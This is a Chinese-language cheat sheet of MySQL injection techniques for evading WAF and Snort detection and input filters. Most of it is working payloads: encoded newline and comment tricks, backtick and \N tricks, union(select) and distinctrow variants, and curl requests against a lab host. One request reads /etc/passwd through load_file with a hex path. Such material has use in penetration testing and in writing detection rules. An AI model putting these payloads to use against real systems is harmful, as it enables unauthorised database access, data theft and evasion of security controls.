# mysql注入绕过技巧

| WAF绕过方式 | 过滤绕过方式 |
| - | - | - |
| %23%0d%0a绕过 | |
| .绕过 | | 
| ``绕过 | |
| /***/注释绕过 | |
| /* */注释绕过 | | 
| \N绕过 | | 
| union(select)绕过 | |
| 科学计数法绕过 | |
| union distinctrow select绕过 | |
| {}绕过| |

## WAF绕过

### %23%0d%0a绕过
%0a等价于\n，%0d等价于\r，%23等价于注释符，在控制台操作时，利用回车换行可输入多条语句，那么利用%23%0a%0d，有机会绕过防火墙检测

如，未变形前的语句：
```shell
z2pdeMacBook-Air:~ z2p$ curl "http://10.100.12.6:8008/?id=1 union select 1,2"
```
变形后：
```shell
z2pdeMacBook-Air:~ z2p$ curl "http://10.100.12.6:8008/?id=1%23%0d%0aunion select 1,2"
```
真实利用：
```shell
z2pdeMacBook-Air:~ z2p$ curl "http://10.100.12.6:8008/?id=1%23%0aunion%23%0aselect%23%0a1,version()"
```

#### 原理
如下图，每次的回车，就相当于%0a
![](./mysql注入绕过技巧/pic1.png)

### .绕过
在数字与union中间用.连接，当正则写的不严谨时会出现绕过
变形后：
```shell
z2pdeMacBook-Air:~ z2p$ curl "http://10.100.12.6:8008/?id=1.union select 1,2"
```

在from后加入.，可能会出现绕过，需要注意的是，from后加.则不能跨库查表
```
select * from test where id=1 union select 1,2,3 from. abc
```

#### 原理
![](./mysql注入绕过技巧/pic2.png)


### ``绕过
1. 利用``将函数名包裹
    ```
    `load_file`(0xxxx)
    `version`()
    ```
2. 利用``将内置变量包裹
    ```
    @@`version`
    @@`datadir`
    ```
3. 利用``将列名包裹，后接from可不需要空格
    ```
    select \N,`schema_name`from information_schema.schemata
    ```
4. 利用``将表名包裹
    ```
    select * from 库.`表名`
    ```

变形后
```shell
z2pdeMacBook-Air:~ z2p$ curl "http://10.100.12.6:8008/?id=1 union select 1,`load_file`(0x2f6574632f706173737764)"
```

### /***/注释绕过
在/* */中间插入*等其他符号，来干扰snort匹配
```
select * from test union/**a*b*c*/select 1,2,3
```

### /* */注释绕过
利用特殊字符，进行绕过
* /*-%-%2b*/
* /*-%-%00*/
* /*-%-%20*/
* /*-%-%7c*/
* /**/

```
select * from test where id=1 union select 1,2,version/**/()
```

### \N绕过
* \N在mysql中相当于NULL的意思，干扰snort匹配
* \N后如果接from，可以不带空格
```
select * from test where id=\Nunion select \N,2,3
```
#### 绕过原理
![](./mysql注入绕过技巧/pic3.png)


### union(select)绕过
将union select变为union(select)
```
select * from test where id=1 union(select 1,2,3)
```

### 科学技术法绕过
```
select * from test where id=1e0union select 1,2,3
```

### union distinctrow select绕过
snort规则通常会针对union select匹配，如果中间加入distinctrow有可能可以bypass
```
select * from test where id=1 union distinctrow select 1,2,3
```

### {}绕过
在5.5及以上版本的mysql中支持该语法，如果规则不当，可能会出现绕过
```
select{x 列名1},{x 列名2}from{x 表名}
```




## 过滤绕过

### order by过滤绕过
### <>过滤绕过
### and过滤绕过
### 替换过滤绕过
### 空格过滤绕过    
空格过滤可以用很多方式来进行绕过，举个例子：
```
select * from test where id=1 union select 1,2,3
```
过滤后会变成
```
select * from test where id=1unionselect1,2,3
```
解决方法：
```
select * from test where id=1/**/union/**/select/**/1,2,3

select * from test where id=1e0union(select-1,2,3)

select * from test where id=1%0aunion%0aselect%0a1,2,3

select * from test where id=1e0union(select(1),(2),(3));

select * from test where id=1e0union(select(1),(2),(3)/**/from(test))
```

### 引号过滤


### ,过滤
逗号过滤，会使联查查询注入列数对不上，导致注入失败；例如以下情况：
```
select * from test where id=1 union select 1,2,3
```
过滤后会变成
```
select * from test where id=1 union select 1 2 3
```
解决方法，利用join来使列数匹配
```
select * from test where id=1 union select * from (select 1)a join (select 2)b join (select 3)c 

mysql> select * from test where id=1 union select * from (select 1)a join (select 2)b join (select 3)c;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
| 1    | zzp      | 123      |
| 1    | 2        | 3        |
+------+----------+----------+
2 rows in set (0.06 sec)
```

盲注时，substr等如没逗号，可这样测试
```
select * from test where id=1 and mid('mysql' from 1 for 1) = 'm'
select * from test where id=1 and substr('mysql' from 1 for 1) = 'm';
```
limit时，逗号影响，可这样测试
```
select * from test where id=1 union select * from a limit 1 offset 1
```



### =绕过


## 破除空格的方法
* \N
    ```
    select\N,2,3
    select1,2,\Nfrom 
    ```
* /**/
    ```
    select/**/1,2,3/**/from/**/admin
    ```
* !
    ```
    select!1,2,3
    ```
* ``
    ```
    select 1,2,3``from test
    select 
    ```
* @
    ```
    select@1,2,3
    ```
* ()
    ```
    select 1,2,3 from(test)
    ```
* 科学技术法
    ```
    select * from test where id=1e0union select 1,2,3
    ```

## 混合bypass
```
http://10.100.12.6:8008/?id=\Nunion%20select%20\N,`schema_name`from%20information_schema.schemata
http://10.100.12.6:8008/?id=1%20union%20distinctrow%20select%201,id%20from%20TestDB.TestTables
http://10.100.12.6:8008/?id=1%20/*!union%20all*/%23%0aselect%201,2
```

## 特殊函数
| 函数 | 功能 |
| - | - |
| @@datadir | 列出mysql目录 |

## 探测语句
```
id=1 or(1)in(1)
id=1 and true
```